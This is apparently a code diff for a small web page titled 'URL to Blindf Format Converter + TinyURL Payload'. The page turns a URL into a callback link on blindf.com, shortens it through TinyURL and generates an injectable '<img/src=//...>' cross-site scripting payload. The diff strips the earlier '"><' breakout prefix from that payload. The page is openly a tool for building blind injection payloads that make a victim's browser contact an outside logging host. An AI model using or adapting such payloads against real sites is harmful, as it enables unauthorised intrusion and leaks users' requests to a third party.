@@ -23,7 +23,7 @@
   </style>
 </head>
 <body>
-  <h2>Test</h2>
+  <h2>URL to Blindf Format Converter + TinyURL Payload</h2>
 
   <label for="urlInput">Enter URL:</label>
   <input type="text" id="urlInput" placeholder="https://www.xyz.com/page?test=value">
@@ -43,23 +43,23 @@
     function convertURL() {
       const input = document.getElementById("urlInput").value.trim();
 
-      // Replace special characters
+      // Remove protocol, replace special characters, and remove whitespace
       const modified = input
-        .replace(/^https?:\/\//, '')  // remove protocol
-        .replace(/[\/=?&]/g, '_');    // replace / ? = & with _
+        .replace(/^https?:\/\//, '')   // remove protocol
+        .replace(/[\/=?&]/g, '_')      // replace / ? = & with _
+        .replace(/\s+/g, '');          // remove any whitespace
 
       const finalURL = `https://blindf.com/b.php?c=${modified}`;
       document.getElementById("output").value = finalURL;
 
-      // Use TinyURL to shorten it
+      // Use TinyURL to shorten
       fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(finalURL)}`)
         .then(response => response.text())
         .then(shortUrl => {
           document.getElementById("shortenedOutput").value = shortUrl;
 
-          // Remove protocol for payload
           const withoutProtocol = shortUrl.replace(/^https?:\/\//, '');
-          const payload = `"><img/src=//${withoutProtocol}>`;
+          const payload = `<img/src=//${withoutProtocol}>`;
           document.getElementById("payloadOutput").value = payload;
         })
         .catch(error => {
